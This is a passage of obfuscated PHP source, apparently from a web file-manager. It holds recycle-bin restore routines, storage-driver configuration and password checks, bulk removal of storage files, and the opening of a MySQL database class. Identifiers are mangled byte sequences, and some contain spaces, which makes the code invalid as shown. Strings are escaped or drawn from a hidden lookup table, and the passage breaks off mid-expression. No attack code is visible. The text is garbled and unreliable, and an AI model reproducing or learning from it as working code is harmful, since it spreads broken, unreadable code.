$this->where(array($ˆüõ÷ó¹[191] => $¿µ¯ áÁ))->delete(); } foreach ($éƒô™Ò’ as $Ãùé ò­) { $öºÄ¬Á->targetSpaceUpdate($Ãùé ò­[$ˆüõ÷ó¹[188]], $Ãùé ò­[$ˆüõ÷ó¹[589]]); } } public function restore($¬İÀ¬‘ = false) { $ŠÕ­¿¦ = $this->listData(); $this->_restoreSource($ŠÕ­¿¦, $¬İÀ¬‘); } public function removeUserAll($€Öš·Š©) { $this->remove(!1, $€Öš·Š©); } public function restoreItem($ˆˆù¶¹Ä) { $this->_restoreSource(array($ˆˆù¶¹Ä), array($ˆˆù¶¹Ä)); } private function _restoreSource($Å‰®óñ, $¾¾ªú¬ø) { $¡‹ëÈıñ =& $_SERVER[µÅ˜º…æ]; $ˆ ş»ªô = Model($¡‹ëÈıñ[1534]); $¾¾ªú¬ø = $¾¾ªú¬ø == !1 ? !1 : $¾¾ªú¬ø; if (!$Å‰®óñ) { return !0; } $Š§…‰ƒß = array(); foreach ($Å‰®óñ as $ôîĞ•µÀ) { if ($¾¾ªú¬ø != !1 && !in_array($ôîĞ•µÀ, $¾¾ªú¬ø)) { continue; } $ëê¸ª = $ˆ ş»ªô->sourceInfo($ôîĞ•µÀ); $¼ü»Àô„ = $ˆ ş»ªô->sourceInfo($ëê¸ª[$¡‹ëÈıñ[190]]); if ($¼ü»Àô„[$¡‹ëÈıñ[520]] == $¡‹ëÈıñ[91]) { continue; } $ˆ ş»ªô->lockMoveStart($ôîĞ•µÀ); $this->recycleMove($ôîĞ•µÀ, 0); if ($ëê¸ª[$¡‹ëÈıñ[500]] == $¡‹ëÈıñ[91]) { $ò ñø¼ = array($¡‹ëÈıñ[674] => array($¡‹ëÈıñ[635], $ëê¸ª[$¡‹ëÈıñ[604]] . $ôîĞ•µÀ . $¡‹ëÈıñ[636])); $ˆ ş»ªô->where($ò ñø¼)->setField($¡‹ëÈıñ[520], 0); $this->restoreFolderChildren($ôîĞ•µÀ, $Å‰®óñ); } $this->where(array($¡‹ëÈıñ[191] => $ôîĞ•µÀ))->delete(); $ˆ ş»ªô->folderSizeReset($ëê¸ª[$¡‹ëÈıñ[190]]); $Š§…‰ƒß[] = $ëê¸ª[$¡‹ëÈıñ[190]]; if ($ëê¸ª[$¡‹ëÈıñ[500]] == $¡‹ëÈıñ[91]) { $Š§…‰ƒß[] = $ôîĞ•µÀ; } $ˆ ş»ªô->lockMoveEnd($ôîĞ•µÀ); } $ˆ ş»ªô->updateModifyTime($Š§…‰ƒß); } private function restoreFolderChildren($æ÷à×Áš, $ßêışº) { $¼•ÈĞ¢„ =& $_SERVER[µÅ˜º…æ]; $™Ğ¯›•‘ = Model($¼•ÈĞ¢„[1534]); $áçá¼ĞŸ = array($¼•ÈĞ¢„[191] => array($¼•ÈĞ¢„[7], array())); foreach ($ßêışº as $µæ•©ÈŸ) { if ($µæ•©ÈŸ == $æ÷à×Áš) { continue; } if (!$™Ğ¯›•‘->isParentOf($æ÷à×Áš, $µæ•©ÈŸ)) { continue; } $œü®šğú = $™Ğ¯›•‘->sourceInfo($µæ•©ÈŸ); if ($œü®šğú[$¼•ÈĞ¢„[500]] == $¼•ÈĞ¢„[91]) { $áçá¼ĞŸ[] = array($¼•ÈĞ¢„[674] => array($¼•ÈĞ¢„[635], $œü®šğú[$¼•ÈĞ¢„[604]] . $µæ•©ÈŸ . $¼•ÈĞ¢„[636])); } else { $áçá¼ĞŸ[$¼•ÈĞ¢„[191]][1][] = $µæ•©ÈŸ; } } if (!$áçá¼ĞŸ[$¼•ÈĞ¢„[191]][1]) { unset($áçá¼ĞŸ[$¼•ÈĞ¢„[191]]); } if (!$áçá¼ĞŸ) { return; } if (is_array($áçá¼ĞŸ[$¼•ÈĞ¢„[191]]) && is_array($áçá¼ĞŸ[$¼•ÈĞ¢„[191]][1])) { $áçá¼ĞŸ[$¼•ÈĞ¢„[191]][1] = array_unique($áçá¼ĞŸ[$¼•ÈĞ¢„[191]][1]); } $áçá¼ĞŸ[$¼•ÈĞ¢„[1169]] = $¼•ÈĞ¢„[2283]; $™Ğ¯›•‘->where($áçá¼ĞŸ)->setField($¼•ÈĞ¢„[520], 1); } private function recycleMove($ï½Ë×œû, $¬ú¥ÇÓ‡ = 1) { $ÃùŒ»‹¼ =& $_SERVER[µÅ˜º…æ]; $ç‰—¬ = Model($ÃùŒ»‹¼[1534]); $“ë±´ŸË = Model($ÃùŒ»‹¼[2512]); $ğ°ÆìÏü = array($ÃùŒ»‹¼[191] => $ï½Ë×œû); if ($¬ú¥ÇÓ‡) { $ç‰—¬->where($ğ°ÆìÏü)->setField($ÃùŒ»‹¼[520], 1); $“ë±´ŸË->eventRecycle($ï½Ë×œû, $ÃùŒ»‹¼[2513]); } else { $ĞÂĞ¦ŒÏ = $ç‰—¬->where($ğ°ÆìÏü)->find(); $…ÒÍÛÏ = $ĞÂĞ¦ŒÏ[$ÃùŒ»‹¼[500]] == $ÃùŒ»‹¼[91]; $ÌÆ’§àí = $ç‰—¬->fileNameAuto($ĞÂĞ¦ŒÏ[$ÃùŒ»‹¼[190]], $ĞÂĞ¦ŒÏ[$ÃùŒ»‹¼[32]], REPEAT_RENAME_FOLDER, $…ÒÍÛÏ); if ($ÌÆ’§àí != $ĞÂĞ¦ŒÏ[$ÃùŒ»‹¼[32]]) { $ç‰—¬->rename($ï½Ë×œû, $ÌÆ’§àí); } $ç‰—¬->where($ğ°ÆìÏü)->setField($ÃùŒ»‹¼[520], 0); $“ë±´ŸË->eventRecycle($ï½Ë×œû, $ÃùŒ»‹¼[967]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x73\x6f\x75\162\x63\145\x53\x65\x63\162\145\x74\x4c\x69\x73\164"; public $field = array("\x73\x6f\x75\x72\x63\145\111\104", "\x74\x79\160\x65\x49\x44", "\x63\162\145\x61\164\x65\x55\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x73\x74\157\162\x61\x67\x65\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\163\x69\x7a\145\x4d\x61\x78", "\x73\x79\x73\164\145\155", "\x64\x65\x66\141\165\x6c\x74", "\144\x72\x69\x76\145\162", "\x63\x6f\156\146\151\x67"); public function listData($ëâê—äñ = false, $óĞÄëŠş = "\155\157\x64\x69\146\171\124\151\155\x65", $®ÎÀ¡Ò = false) { $Ãû‰Ø¦§ =& $_SERVER[µÅ˜º…æ]; $Ú£Ú£»È = parent::listData($ëâê—äñ, $óĞÄëŠş, $®ÎÀ¡Ò); if ($ëâê—äñ) { return $Ú£Ú£»È; } $ö‡±ÃÙÏ = array(); if ($GLOBALS[$Ãû‰Ø¦§[2514]]) { $ö‡±ÃÙÏ = $this->ioSizeUseGet(array_to_keyvalue($Ú£Ú£»È, $Ãû‰Ø¦§[12], $Ãû‰Ø¦§[487])); } foreach ($Ú£Ú£»È as $èˆÄò¤… => $Ò´˜• ›) { unset($Ú£Ú£»È[$èˆÄò¤…][$Ãû‰Ø¦§[6]]); $Ú£Ú£»È[$èˆÄò¤…][$Ãû‰Ø¦§[2169]] = isset($ö‡±ÃÙÏ[$Ò´˜• ›[$Ãû‰Ø¦§[487]]]) ? $ö‡±ÃÙÏ[$Ò´˜• ›[$Ãû‰Ø¦§[487]]] : 0; } return $Ú£Ú£»È; } public function ioSizeUseGet($æ¼ûŒïŠ) { $¯¾°ñîŠ =& $_SERVER[µÅ˜º…æ]; if (!$æ¼ûŒïŠ) { return array(); } $¬¥ŞĞéñ = $¯¾°ñîŠ[2515] . implode($¯¾°ñîŠ[50], $æ¼ûŒïŠ); $½ÉøÛ®” = Cache::get($¬¥ŞĞéñ); if ($½ÉøÛ®”) { return $½ÉøÛ®”; } $„íÒÊ¢ = array($¯¾°ñîŠ[925] => $¯¾°ñîŠ[487], $¯¾°ñîŠ[2516] => $¯¾°ñîŠ[79]); $´¨Èİ‘ = array($¯¾°ñîŠ[925] => array($¯¾°ñîŠ[7], $æ¼ûŒïŠ)); $½ÉøÛ®” = Model($¯¾°ñîŠ[915])->field($„íÒÊ¢)->where($´¨Èİ‘)->group($¯¾°ñîŠ[925])->select(); $½ÉøÛ®” = array_to_keyvalue($½ÉøÛ®”, $¯¾°ñîŠ[487], $¯¾°ñîŠ[79]); Cache::set($¬¥ŞĞéñ, $½ÉøÛ®”, 600); return $½ÉøÛ®”; } public function getConfig($‡¦şÌõ) { $óîã¨İ– = parent::listData($‡¦şÌõ); $‘ú²íßŞ = _get($óîã¨İ–, $_SERVER[µÅ˜º…æ][6], array()); if ($‘ú²íßŞ && !is_array($‘ú²íßŞ)) { $‘ú²íßŞ = json_decode($‘ú²íßŞ, !0); } return $‘ú²íßŞ; } public function update($·º÷¡Âì, $®å•œ‹«) { $Ó¡ã˜Œ =& $_SERVER[µÅ˜º…æ]; $ı×üÒÊ× = $®å•œ‹«[$Ó¡ã˜Œ[32]]; $•œØÖ÷ = array_to_keyvalue(parent::listData(), $Ó¡ã˜Œ[32]); if (isset($•œØÖ÷[$ı×üÒÊ×]) && $•œØÖ÷[$ı×üÒÊ×][$Ó¡ã˜Œ[487]] != $·º÷¡Âì) { return !1; } $this->checkPwd($·º÷¡Âì, $®å•œ‹«); if (isset($®å•œ‹«[$Ó¡ã˜Œ[2517]]) && $®å•œ‹«[$Ó¡ã˜Œ[2517]] == $Ó¡ã˜Œ[91]) { $this->checkConfig($®å•œ‹«); } unset($®å•œ‹«[$Ó¡ã˜Œ[2517]]); $öåŞÜ”û = parent::update($·º÷¡Âì, $®å•œ‹«); if ($öåŞÜ”û && $®å•œ‹«[$Ó¡ã˜Œ[37]]) { foreach ($•œØÖ÷ as $šŒ‹öôĞ) { if ($šŒ‹öôĞ[$Ó¡ã˜Œ[37]] && $šŒ‹öôĞ[$Ó¡ã˜Œ[487]] != $·º÷¡Âì) { parent::update($šŒ‹öôĞ[$Ó¡ã˜Œ[487]], array($Ó¡ã˜Œ[37] => 0)); } } $this->updateBackup($·º÷¡Âì, $•œØÖ÷); } return $öåŞÜ”û; } public function add($œ¯ĞÌÄß) { $­¿ãá¸ô =& $_SERVER[µÅ˜º…æ]; $Íºî˜­• = array_to_keyvalue(parent::listData(), $­¿ãá¸ô[32]); if (isset($Íºî˜­•[$œ¯ĞÌÄß[$­¿ãá¸ô[32]]])) { return !1; } $this->checkConfig($œ¯ĞÌÄß); $±ëŠ‡ç· = parent::insert($œ¯ĞÌÄß); if ($±ëŠ‡ç· && $œ¯ĞÌÄß[$­¿ãá¸ô[37]]) { foreach ($Íºî˜­• as $¿ÙÇ†’Ú) { if ($¿ÙÇ†’Ú[$­¿ãá¸ô[37]]) { parent::update($¿ÙÇ†’Ú[$­¿ãá¸ô[487]], array($­¿ãá¸ô[37] => 0)); } } $this->updateBackup($±ëŠ‡ç·, $Íºî˜­•); } return $±ëŠ‡ç·; } public function updateBackup($Š¿‚ œø, $Ô‹èÖÀ¥) { $´ú‘¿”¬ =& $_SERVER[µÅ˜º…æ]; $û“©é“ß = Model($´ú‘¿”¬[872])->get($´ú‘¿”¬[878]); $û“©é“ß = json_decode($û“©é“ß, !0); if (!$û“©é“ß) { return; } if ($û“©é“ß[$´ú‘¿”¬[1946]] != $´ú‘¿”¬[91]) { return; } $ªµÀŠéâ = $û“©é“ß[$´ú‘¿”¬[851]]; if ($û“©é“ß[$´ú‘¿”¬[168]] != $´ú‘¿”¬[1309]) { if ($ªµÀŠéâ != $Š¿‚ œø) { return; } $û“©é“ß[$´ú‘¿”¬[168]] = $´ú‘¿”¬[1309]; } else { if ($ªµÀŠéâ == $Š¿‚ œø) { return; } $û“©é“ß[$´ú‘¿”¬[851]] = $Š¿‚ œø; } Model($´ú‘¿”¬[872])->set(array($´ú‘¿”¬[878] => $û“©é“ß)); } public function checkPwd($Ø‘«ûï», &$Ê³ÀØ»³) { $÷æÒîÒó =& $_SERVER[µÅ˜º…æ]; if (empty($Ê³ÀØ»³[$÷æÒîÒó[6]])) { return; } $Êµı’—Ä = $Ê³ÀØ»³[$÷æÒîÒó[6]]; if (!is_array($Êµı’—Ä)) { $Êµı’—Ä = json_decode($Êµı’—Ä, !0); } $Ñé†½“Å = $÷æÒîÒó[12]; $ÆåËÊº… = array($÷æÒîÒó[1642], $÷æÒîÒó[2518], $÷æÒîÒó[1052]); foreach ($ÆåËÊº… as $û—©åïœ) { if (isset($Êµı’—Ä[$û—©åïœ])) { $Ñé†½“Å = $û—©åïœ; break; } } if (!$Ñé†½“Å) { return; } $ªØçŠÌŠ = $this->getConfig($Ø‘«ûï»); $‰Û­Éòæ = $ªØçŠÌŠ[$Ñé†½“Å]; $®³â¯ = $Êµı’—Ä[$Ñé†½“Å]; if ($®³â¯ == str_repeat($÷æÒîÒó[220], strlen($‰Û­Éòæ))) { $Êµı’—Ä[$Ñé†½“Å] = $‰Û­Éòæ; $Ê³ÀØ»³[$÷æÒîÒó[6]] = json_encode($Êµı’—Ä); } else { if ($®³â¯ != $‰Û­Éòæ) { $Ê³ÀØ»³[$÷æÒîÒó[2517]] = $÷æÒîÒó[91]; } } } public function checkConfig(&$¨è“öäê, $È÷äÙ‘ = false) { $ßõØ¶ÇŒ =& $_SERVER[µÅ˜º…æ]; $µÓÛÎ£½ = strtolower($¨è“öäê[$ßõØ¶ÇŒ[96]]); $”•ß‰´® = $¨è“öäê[$ßõØ¶ÇŒ[6]]; if (!is_array($”•ß‰´®)) { $”•ß‰´® = json_decode($”•ß‰´®, !0); } foreach ($”•ß‰´® as $è­¼ô¶Ã => $Èöæ¥…Â) { if (is_string($Èöæ¥…Â)) { $”•ß‰´®[$è­¼ô¶Ã] = trim($Èöæ¥…Â); } } $”•ß‰´®[$ßõØ¶ÇŒ[2519]] = rand_string(6); $š·ùÒ‹‰ = $GLOBALS[$ßõØ¶ÇŒ[6]][$ßõØ¶ÇŒ[92]][$ßõØ¶ÇŒ[933]]; $õ‘’‹ªŸ = isset($š·ùÒ‹‰[$µÓÛÎ£½]) ? $š·ùÒ‹‰[$µÓÛÎ£½] : ucfirst($µÓÛÎ£½); $£ƒÑº·Á = $ßõØ¶ÇŒ[77] . $õ‘’‹ªŸ; if (!$õ‘’‹ªŸ || !class_exists($£ƒÑº·Á)) { if ($È÷äÙ‘) { return LNG($ßõØ¶ÇŒ[2520]); } write_log(array($ßõØ¶ÇŒ[2521], $¨è“öäê, get_caller_info()), $ßõØ¶ÇŒ[213]); show_json(LNG($ßõØ¶ÇŒ[2520]), !1, $¨è“öäê); } $şÓç¦Ä« = new $£ƒÑº·Á($”•ß‰´®); $Ã¼ê›à¹ = rtrim($”•ß‰´®[$ßõØ¶ÇŒ[1370]], $ßõØ¶ÇŒ[8]) . $ßõØ¶ÇŒ[8]; if (in_array($µÓÛÎ£½, $şÓç¦Ä«->objectDriver)) { try { if (!$şÓç¦Ä«->isBucketCors() && !$şÓç¦Ä«->setBucketCors()) { $Ú ’Ÿ‚ = LNG($ßõØ¶ÇŒ[2522]); $Ú ’Ÿ‚ .= $ßõØ¶ÇŒ[2523] . LNG($ßõØ¶ÇŒ[2524]); } } catch (Exception $²ä”¢²Ë) { $Ú ’Ÿ‚ = $²ä”¢²Ë->getMessage(); } if (isset($Ú ’Ÿ‚)) { return $this->_parseError($Ú ’Ÿ‚, $µÓÛÎ£½, $È÷äÙ‘); } if ($µÓÛÎ£½ == $ßõØ¶ÇŒ[68]) { $åú­ö€¾ = $şÓç¦Ä«->getBktRegion(); if ($åú­ö€¾ != $”•ß‰´®[$ßõØ¶ÇŒ[2525]]) { $”•ß‰´®[$ßõØ¶ÇŒ[2525]] = $åú­ö€¾; $şÓç¦Ä«->setRegion($åú­ö€¾); } } } else { if ($µÓÛÎ£½ == $ßõØ¶ÇŒ[2526]) { if ($şÓç¦Ä«->ftpPath) { $Å¹åĞ¥ = trim($Ã¼ê›à¹, $ßõØ¶ÇŒ[8]); if (stripos($Å¹åĞ¥, trim($şÓç¦Ä«->ftpPath, $ßõØ¶ÇŒ[8])) !== 0) { $Ã¼ê›à¹ = $şÓç¦Ä«->ftpPath . $ßõØ¶ÇŒ[8] . ($Å¹åĞ¥ ? $Å¹åĞ¥ . $ßõØ¶ÇŒ[8] : $ßõØ¶ÇŒ[12]); } } } } $ÕÑèÔ¼ş = $şÓç¦Ä«->getPath($Ã¼ê›à¹ . $ßõØ¶ÇŒ[1374]); try { if ($µÓÛÎ£½ == $ßõØ¶ÇŒ[106]) { $şÓç¦Ä«->mkdir($Ã¼ê›à¹, REPEAT_SKIP); } $Á¦ä”í… = $şÓç¦Ä«->mkfile($ÕÑèÔ¼ş, $ßõØ¶ÇŒ[12], REPEAT_REPLACE); if (!$Á¦ä”í…) { $Ú ’Ÿ‚ = LNG($ßõØ¶ÇŒ[2522]); } } catch (Exception $²ä”¢²Ë) { $Ú ’Ÿ‚ = $²ä”¢²Ë->getMessage(); } if (isset($Ú ’Ÿ‚)) { return $this->_parseError($Ú ’Ÿ‚, $µÓÛÎ£½, $È÷äÙ‘); } $”•ß‰´®[$ßõØ¶ÇŒ[1370]] = $Ã¼ê›à¹; $¨è“öäê[$ßõØ¶ÇŒ[6]] = json_encode($”•ß‰´®); $¨è“öäê[$ßõØ¶ÇŒ[96]] = $õ‘’‹ªŸ; return !0; } private function _parseError($ÇÓŠç›‡, $™İ„æÜı, $äŸšÁ³Ô = false) { $ßÄÄ²¾² =& $_SERVER[µÅ˜º…æ]; if ($™İ„æÜı == $ßÄÄ²¾²[68] && stripos($ÇÓŠç›‡, $ßÄÄ²¾²[2527])) { $ƒ·ËŠ‡… = explode($ßÄÄ²¾²[10], $ÇÓŠç›‡); $ÀÙìÕõ­ = isset($ƒ·ËŠ‡…[1]) ? $ƒ·ËŠ‡…[1] : $ßÄÄ²¾²[12]; $×¹£Ÿˆá = array($ßÄÄ²¾²[2528] => LNG($ßÄÄ²¾²[2529]), $ßÄÄ²¾²[2530] => LNG($ßÄÄ²¾²[2531])); if (isset($×¹£Ÿˆá[$ÀÙìÕõ­])) { $ÇÓŠç›‡ = $×¹£Ÿˆá[$ÀÙìÕõ­]; } } if (stripos($ÇÓŠç›‡, $ßÄÄ²¾²[2532]) === 0) { $÷Ú™Ş = strpos($ÇÓŠç›‡, $ßÄÄ²¾²[175]); if ($÷Ú™Ş === !1) { $÷Ú™Ş = strpos($ÇÓŠç›‡, $ßÄÄ²¾²[4]); } if ($÷Ú™Ş !== !1) { $ÇÓŠç›‡ = substr($ÇÓŠç›‡, $÷Ú™Ş + 1); } } $ÇÓŠç›‡ = LNG($ßÄÄ²¾²[1377]) . $ÇÓŠç›‡; if ($äŸšÁ³Ô) { return $ÇÓŠç›‡; } show_json($ÇÓŠç›‡, !1); } public function driverListSystem() { $¨„ô“”é =& $_SERVER[µÅ˜º…æ]; $ÖßØœå = parent::listData(); $Ÿ“«°¸Ä = array(); foreach ($ÖßØœå as $Û¶™²‡ş) { unset($Û¶™²‡ş[$¨„ô“”é[231]], $Û¶™²‡ş[$¨„ô“”é[88]]); if (!is_array($Û¶™²‡ş[$¨„ô“”é[6]])) { $Û¶™²‡ş[$¨„ô“”é[6]] = json_decode($Û¶™²‡ş[$¨„ô“”é[6]], !0); } $Ÿ“«°¸Ä[] = $Û¶™²‡ş; } return $Ÿ“«°¸Ä; } public function defaultDriver() { $ãîç¦– =& $_SERVER[µÅ˜º…æ]; $â·í³ç = parent::listData(); $Ì¡µ ß¼ = array_filter_by_field($â·í³ç, $ãîç¦–[37], 1); $Ì¡µ ß¼ = $Ì¡µ ß¼[0]; if (!$Ì¡µ ß¼) { return array(); } if (!is_array($Ì¡µ ß¼[$ãîç¦–[6]])) { $Ì¡µ ß¼[$ãîç¦–[6]] = json_decode($Ì¡µ ß¼[$ãîç¦–[6]], !0); } return $Ì¡µ ß¼; } public function driverInfo($»é…ˆÇˆ) { $©ÎÑÉüª =& $_SERVER[µÅ˜º…æ]; $à†»¸  = array_to_keyvalue(parent::listData(), $©ÎÑÉüª[487]); if (!isset($à†»¸ [$»é…ˆÇˆ])) { return !1; } $ÚçÍ˜ = $à†»¸ [$»é…ˆÇˆ]; if (!is_array($ÚçÍ˜[$©ÎÑÉüª[6]])) { $ÚçÍ˜[$©ÎÑÉüª[6]] = json_decode($ÚçÍ˜[$©ÎÑÉüª[6]], !0); } return $ÚçÍ˜; } public function remove($®•Àä×’) { $this->removeShareItems($®•Àä×’); return parent::remove($®•Àä×’); } public function removeWithFile($û”‚š, $»ï°ì¶Ë, $ñ¢£¼°±, $¬üÔ¦ÊÚ = false) { $Â¸ éÎ– =& $_SERVER[µÅ˜º…æ]; ignore_timeout(); $Ğß›Êè = array($Â¸ éÎ–[925] => $û”‚š); $·³Š» = Model($Â¸ éÎ–[560]); if (isset($GLOBALS[$Â¸ éÎ–[2533]])) { $’ºÒ®®‡ = $GLOBALS[$Â¸ éÎ–[2533]]; } else { $’ºÒ®®‡ = $·³Š»->where($Ğß›Êè)->field(array($Â¸ éÎ–[948] => $Â¸ éÎ–[949], $Â¸ éÎ–[950] => $Â¸ éÎ–[79]))->find(); } $×›°¦Õ = intval($’ºÒ®®‡[$Â¸ éÎ–[949]]); $”Ç¯ê‘ = intval($’ºÒ®®‡[$Â¸ éÎ–[79]]); $¿Âó×“ = $»ï°ì¶Ë . $Â¸ éÎ–[2534] . $û”‚š; $ƒùÓÂ…â = LNG($»ï°ì¶Ë == $Â¸ éÎ–[643] ? $Â¸ éÎ–[2535] : $Â¸ éÎ–[2536]); $ÕçõÃßÖ = new TaskFileTransfer($¿Âó×“, $Â¸ éÎ–[213], $×›°¦Õ, $ƒùÓÂ…â . $Â¸ éÎ–[476] . $ñ¢£¼°±[$Â¸ éÎ–[32]] . $Â¸ éÎ–[212] . $û”‚š); $ÕçõÃßÖ->task[$Â¸ éÎ–[863]] = (double) $”Ç¯ê‘; $±›Ç‚Âå = KodIO::defaultDriver(); $ ªšÜ• = $±›Ç‚Âå[$Â¸ éÎ–[487]]; $œƒ£»±Ä = 1; $ÈÔÉù³ = 5000; $İš’‚ìÎ = $¥¯‹¯¥¢ = $”‰«€¹ = array(); $ÓÖ‹Âµ = $·³Š»->where($Ğß›Êè)->field($Â¸ éÎ–[2537])->selectPage($ÈÔÉù³, $œƒ£»±Ä); $æº›­·Ì = intval($ÓÖ‹Âµ[$Â¸ éÎ–[443]][$Â¸ éÎ–[445]]); while ($ÓÖ‹Âµ && $œƒ£»±Ä <= $æº›­·Ì) { foreach ($ÓÖ‹Âµ[$Â¸ éÎ–[446]] as $´ôÕƒ«å) { $æÕÁ¿å— = $´ôÕƒ«å[$Â¸ éÎ–[557]]; if ($¬üÔ¦ÊÚ) { $¥¯‹¯¥¢[] = $æÕÁ¿å—; continue; } $“§‰„˜¸ = $´ôÕƒ«å[$Â¸ éÎ–[87]]; $ŸªúÊÎ× = rtrim(get_path_father($“§‰„˜¸), $Â¸ éÎ–[8]) . $Â¸ éÎ–[8]; $”‰«€¹[] = $ŸªúÊÎ×; $ŸªúÊÎ× = str_replace("\x7b\x69\x6f\72{$û”‚š}\x7d\x2f", "\x7b\x69\x6f\x3a{$ ªšÜ•}\x7d\57", $ŸªúÊÎ×); if (!IO::exist($“§‰„˜¸) || !IO::isFile($“§‰„˜¸)) { $İš’‚ìÎ[] = $æÕÁ¿å—; $ÕçõÃßÖ->updateFileEnd($´ôÕƒ«å[$Â¸ éÎ–[32]], $´ôÕƒ«å[$Â¸ éÎ–[79]]); write_log($Â¸ éÎ–[2538] . $“§‰„˜¸, $Â¸ éÎ–[2116]); continue; } $Æéß¨ó¯ = IO::move($“§‰„˜¸, $ŸªúÊÎ×, REPEAT_RENAME); if (!$Æéß¨ó¯) { $¥¯‹¯¥¢[] = $æÕÁ¿å—; $ÕçõÃßÖ->updateFileEnd($´ôÕƒ«å[$Â¸ éÎ–[32]], $´ôÕƒ«å[$Â¸ éÎ–[79]]); write_log($Â¸ éÎ–[2539] . $“§‰„˜¸, $Â¸ éÎ–[2116]); continue; } $–Àó÷³ = array($Â¸ éÎ–[925] => $ ªšÜ•, $Â¸ éÎ–[87] => $Æéß¨ó¯); $·³Š»->where(array($Â¸ éÎ–[557] => $æÕÁ¿å—))->save($–Àó÷³); } $œƒ£»±Ä++; $ÓÖ‹Âµ = $·³Š»->where($Ğß›Êè)->field($Â¸ éÎ–[2537])->selectPage($ÈÔÉù³, $œƒ£»±Ä); } $¶¤«‘¬À = $ÕçõÃßÖ->task; if (!$¬üÔ¦ÊÚ) { Cache::set($¿Âó×“, $¶¤«‘¬À); } $ÕçõÃßÖ->end(); $İš’‚ìÎ = array_unique($İš’‚ìÎ); $¥¯‹¯¥¢ = array_unique($¥¯‹¯¥¢); if (!$¬üÔ¦ÊÚ && ($İš’‚ìÎ || $¥¯‹¯¥¢)) { $‚¤ŒŞÎ˜ = array(); if ($İš’‚ìÎ) { $‚¤ŒŞÎ˜[] = sprintf(LNG($Â¸ éÎ–[2540]), count($İš’‚ìÎ)); } if ($¥¯‹¯¥¢) { $‚¤ŒŞÎ˜[] = sprintf(LNG($Â¸ éÎ–[2541]), count($¥¯‹¯¥¢)); } $‚¤ŒŞÎ˜ = sprintf(LNG($Â¸ éÎ–[2542]), implode($Â¸ éÎ–[1587], $‚¤ŒŞÎ˜)) . $Â¸ éÎ–[2543] . date($Â¸ éÎ–[2544]) . $Â¸ éÎ–[2545]; if ($»ï°ì¶Ë == $Â¸ éÎ–[1335]) { $‚¤ŒŞÎ˜ .= $Â¸ éÎ–[2546] . LNG($Â¸ éÎ–[2547]); } else { $‚¤ŒŞÎ˜ = LNG($Â¸ éÎ–[2548]) . $Â¸ éÎ–[2549] . $‚¤ŒŞÎ˜; } $¶¤«‘¬À[$Â¸ éÎ–[1372]] = $‚¤ŒŞÎ˜; Cache::set($¿Âó×“, $¶¤«‘¬À); unset($ñ¢£¼°±[$Â¸ éÎ–[6]]); $ÊÁÏÑ¹÷ = array($Â¸ éÎ–[487] => $û”‚š, $Â¸ éÎ–[2422] => $Â¸ éÎ–[643], $Â¸ éÎ–[32] => $ñ¢£¼°±[$Â¸ éÎ–[32]], $Â¸ éÎ–[96] => $ñ¢£¼°±[$Â¸ éÎ–[96]]); Hook::trigger($Â¸ éÎ–[1986], array($Â¸ éÎ–[1393] => $ÊÁÏÑ¹÷, $Â¸ éÎ–[1403] => !0)); show_json($‚¤ŒŞÎ˜, !1, 100111); } if ($»ï°ì¶Ë == $Â¸ éÎ–[643]) { return !0; } if ($İš’‚ìÎ || $¥¯‹¯¥¢) { $„ì™Í¹È = array_merge($İš’‚ìÎ, $¥¯‹¯¥¢); $„ì™Í¹È = array_filter(array_unique($„ì™Í¹È)); $this->removeByFileID($„ì™Í¹È); } if ($”‰«€¹) { $”‰«€¹ = array_filter(array_unique($”‰«€¹)); foreach ($”‰«€¹ as $“§‰„˜¸) { $’ºÒ®®‡ = IO::has($“§‰„˜¸, !0); if (!$’ºÒ®®‡[$Â¸ éÎ–[239]] && !$’ºÒ®®‡[$Â¸ éÎ–[240]]) { IO::remove($“§‰„˜¸); } } } return $this->remove($û”‚š); } private function removeByFileID($èïº¸‰£ = array()) { $ğ½ÊÄ°­ =& $_SERVER[µÅ˜º…æ]; if (empty($èïº¸‰£)) { return; } $¹éÌÈ‹ë = array($ğ½ÊÄ°­[557] => array($ğ½ÊÄ°­[7], $èïº¸‰£)); $®¶üæ£å = Model($ğ½ÊÄ°­[1534])->where($¹éÌÈ‹ë)->field($ğ½ÊÄ°­[2496])->select(); if (!$®¶üæ£å) { return Model($ğ½ÊÄ°­[560])->remove($èïº¸‰£); } $®¶üæ£å = array_to_keyvalue($®¶üæ£å, $ğ½ÊÄ°­[191], $ğ½ÊÄ°­[557]); foreach ($®¶üæ£å as $¤çêÔË => $É¨›Ô“´) { Model($ğ½ÊÄ°­[932])->removeNow($¤çêÔË, !1); } $®›§È”† = array_diff($èïº¸‰£, array_unique(array_values($®¶üæ£å))); if ($®›§È”†) { return Model($ğ½ÊÄ°­[560])->remove($®›§È”†); } } private function removeShareItems($¬šì¹«¶) { $äç¿ÍÈ€ =& $_SERVER[µÅ˜º…æ]; $üµªÓò’ = "\173\151\x6f\x3a{$¬šì¹«¶}\175\x2f"; $³ëˆÎäö = array($äç¿ÍÈ€[191] => 0, $äç¿ÍÈ€[583] => array($äç¿ÍÈ€[473], "{$üµªÓò’}\45")); $€ÇäÛô¢ = Model($äç¿ÍÈ€[1563])->where($³ëˆÎäö)->field($äç¿ÍÈ€[687])->select(); if (empty($€ÇäÛô¢)) { return; } $€Œ›éÀ = array_to_keyvalue($€ÇäÛô¢, $äç¿ÍÈ€[12], $äç¿ÍÈ€[687]); Model($äç¿ÍÈ€[686])->remove($€Œ›éÀ); } } goto Aƒ¢à‚Øˆ; BŠùÍšÁ”Ğ: class DbMysql extends Db { public function __construct($—ô×ÓÜŒ = '') { $ŞÙáã‹ =& $_SERVER[µÅ˜º…æ]; if (!extension_loaded($ŞÙáã‹[900])) { think_exception(think_lang($ŞÙáã‹[14]) . $ŞÙáã‹[1048]); } if (!empty($—ô×ÓÜŒ)) { $this->config = $—ô×ÓÜŒ; if (empty($this->config[$ŞÙáã‹[17]])) { $this->config[$ŞÙáã‹[17]] = $ŞÙáã‹[12]; } } } public function connect($ÇÆ“º² = '', $µŒğå½² = 0, $‡ï„‰–â = false) { $ªÕØë˜ =& $_SERVER[µÅ˜º…æ]; if (!isset($this->linkID[$µŒğå½²])) { if (empty($ÇÆ“º²)) { $ÇÆ“º² = $this->config; } $ÊÙõüÙ£ = $ÇÆ“º²[$ªÕØë˜[1049]] . ($ÇÆ“º²[$ªÕØë˜[1050]] ? 